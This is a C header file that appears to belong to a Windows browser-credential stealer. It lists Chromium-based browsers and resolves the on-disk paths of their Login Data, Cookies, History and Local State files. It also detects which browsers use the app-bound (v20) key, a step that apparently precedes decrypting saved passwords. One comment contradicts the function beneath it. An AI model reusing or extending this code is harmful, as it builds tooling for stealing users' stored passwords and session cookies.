#pragma once
#ifndef BROWSER_DEFS_H
#define BROWSER_DEFS_H

// Browser type enum and data paths.
// Header only - every string is declared inside the function that uses it,
// no file scope constants, no global state.

#include "Common.h"

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Browser Type Enum

typedef enum _BROWSER_TYPE
{
    BROWSER_UNKNOWN = -1,
    BROWSER_CHROME,
    BROWSER_BRAVE,
    BROWSER_EDGE,
    BROWSER_OPERA,
    BROWSER_OPERA_GX,
    BROWSER_VIVALDI,

    BROWSER_COUNT,

} BROWSER_TYPE;

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// File paths

typedef enum _BROWSER_FILE_TYPE
{
    FILE_TYPE_WEB_DATA,
    FILE_TYPE_HISTORY,
    FILE_TYPE_COOKIES,
    FILE_TYPE_LOGIN_DATA,
    FILE_TYPE_BOOKMARKS,
    FILE_TYPE_LOCAL_STATE

} BROWSER_FILE_TYPE;

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Getters - every string getter returns a heap-allocated copy (free with HeapFree)

static LPSTR GetBrowserName(IN BROWSER_TYPE Browser)
{
    CHAR    szName[BUFFER_SIZE_64]  = { 0 };

    if (Browser == BROWSER_CHROME)
        lstrcpyA(szName, "Chrome");
    else if (Browser == BROWSER_BRAVE)
        lstrcpyA(szName, "Brave");
    else if (Browser == BROWSER_EDGE)
        lstrcpyA(szName, "Edge");
    else if (Browser == BROWSER_OPERA)
        lstrcpyA(szName, "Opera");
    else if (Browser == BROWSER_OPERA_GX)
        lstrcpyA(szName, "OperaGX");
    else if (Browser == BROWSER_VIVALDI)
        lstrcpyA(szName, "Vivaldi");
    else
        lstrcpyA(szName, "Unknown");

    return DuplicateAnsiStringA(szName);
}

static LPSTR GetChromiumBrowserBasePath(IN BROWSER_TYPE Browser)
{
    CHAR    szBasePath[MAX_PATH]    = { 0 };
    BOOL    bFound                  = TRUE;

    if (Browser == BROWSER_CHROME)
        lstrcpyA(szBasePath, "Google\\Chrome\\User Data");
    else if (Browser == BROWSER_BRAVE)
        lstrcpyA(szBasePath, "BraveSoftware\\Brave-Browser\\User Data");
    else if (Browser == BROWSER_EDGE)
        lstrcpyA(szBasePath, "Microsoft\\Edge\\User Data");
    else if (Browser == BROWSER_OPERA)
        lstrcpyA(szBasePath, "Opera Software\\Opera Stable");
    else if (Browser == BROWSER_OPERA_GX)
        lstrcpyA(szBasePath, "Opera Software\\Opera GX Stable");
    else if (Browser == BROWSER_VIVALDI)
        lstrcpyA(szBasePath, "Vivaldi\\User Data");
    else
        bFound = FALSE;

    return bFound ? DuplicateAnsiStringA(szBasePath) : NULL;
}

static LPSTR GetChromiumFileSuffix(IN BROWSER_FILE_TYPE FileType)
{
    CHAR    szSuffix[MAX_PATH]  = { 0 };
    BOOL    bFound              = TRUE;

    if (FileType == FILE_TYPE_WEB_DATA)
        lstrcpyA(szSuffix, "\\Default\\Web Data");
    else if (FileType == FILE_TYPE_HISTORY)
        lstrcpyA(szSuffix, "\\Default\\History");
    else if (FileType == FILE_TYPE_COOKIES)
        lstrcpyA(szSuffix, "\\Default\\Network\\Cookies");
    else if (FileType == FILE_TYPE_LOGIN_DATA)
        lstrcpyA(szSuffix, "\\Default\\Login Data");
    else if (FileType == FILE_TYPE_BOOKMARKS)
        lstrcpyA(szSuffix, "\\Default\\Bookmarks");
    else if (FileType == FILE_TYPE_LOCAL_STATE)
        lstrcpyA(szSuffix, "\\Local State");
    else
        bFound = FALSE;

    return bFound ? DuplicateAnsiStringA(szSuffix) : NULL;
}

// Builds "<base path><file suffix>" (relative to the browser data root).
static BOOL GetChromiumBrowserFilePath(IN BROWSER_TYPE Browser, IN BROWSER_FILE_TYPE FileType, OUT LPSTR pszBuffer, IN DWORD dwBufferSize)
{
    LPSTR   pszBasePath  = NULL;
    LPSTR   pszSuffix    = NULL;
    BOOL    bResult      = FALSE;

    pszBasePath  = GetChromiumBrowserBasePath(Browser);
    pszSuffix    = GetChromiumFileSuffix(FileType);

    if (!pszBasePath || !pszSuffix || !pszBuffer || dwBufferSize == 0)
        goto _END_OF_FUNC;

    if ((DWORD)lstrlenA(pszBasePath) + (DWORD)lstrlenA(pszSuffix) + 1 > dwBufferSize)
        goto _END_OF_FUNC;

    lstrcpyA(pszBuffer, pszBasePath);
    lstrcatA(pszBuffer, pszSuffix);

    bResult = TRUE;

_END_OF_FUNC:

    HEAP_FREE(pszBasePath);
    HEAP_FREE(pszSuffix);

    return bResult;
}

// Resolves a browser-relative path into a full path. Chrome/Brave/Edge/Vivaldi
// live under LOCALAPPDATA, Opera/Opera GX under APPDATA (Roaming) - so both
// roots are probed. Only returns a path when the file actually exists.
static BOOL BuildBrowserDataFilePath(IN BROWSER_TYPE Browser, IN LPCSTR pszRelPath, OUT LPSTR pszBuffer, IN DWORD dwBufferSize)
{
    CHAR        szRoot[MAX_PATH]   = { 0 };
    LPSTR       pszBasePath        = NULL;
    LPCSTR      pszLocalAppData    = "LOCALAPPDATA";
    LPCSTR      pszAppData         = "APPDATA";
    BOOL        bValidBrowser      = FALSE;

    // Validate the browser type through its base path getter
    if ((pszBasePath = GetChromiumBrowserBasePath(Browser)) != NULL)
    {
        HEAP_FREE(pszBasePath);
        bValidBrowser = TRUE;
    }

    if (!bValidBrowser || !pszRelPath || !pszBuffer || dwBufferSize == 0)
        return FALSE;

    if (GetEnvironmentVariableA(pszLocalAppData, szRoot, MAX_PATH))
    {
        wsprintfA(pszBuffer, "%s\\%s", szRoot, pszRelPath);
        if (FileExistsA(pszBuffer))
            return TRUE;
    }

    if (GetEnvironmentVariableA(pszAppData, szRoot, MAX_PATH))
    {
        wsprintfA(pszBuffer, "%s\\%s", szRoot, pszRelPath);
        if (FileExistsA(pszBuffer))
            return TRUE;
    }

    return FALSE;
}

// Browser detection for the standalone EXE: a browser counts as installed
// when its "Local State" file exists in the expected data root.
static BOOL IsBrowserDataPresent(IN BROWSER_TYPE Browser)
{
    CHAR szRelPath[MAX_PATH]   = { 0 };
    CHAR szFullPath[MAX_PATH]  = { 0 };

    if (!GetChromiumBrowserFilePath(Browser, FILE_TYPE_LOCAL_STATE, szRelPath, MAX_PATH))
        return FALSE;

    return BuildBrowserDataFilePath(Browser, szRelPath, szFullPath, MAX_PATH);
}

// Browsers that do not ship the app-bound (v20) elevation service.
static BOOL BrowserSupportsV20Key(IN BROWSER_TYPE Browser)
{
    return (Browser == BROWSER_CHROME || Browser == BROWSER_EDGE || Browser == BROWSER_BRAVE) ? TRUE : FALSE;
}

#endif // !BROWSER_DEFS_H
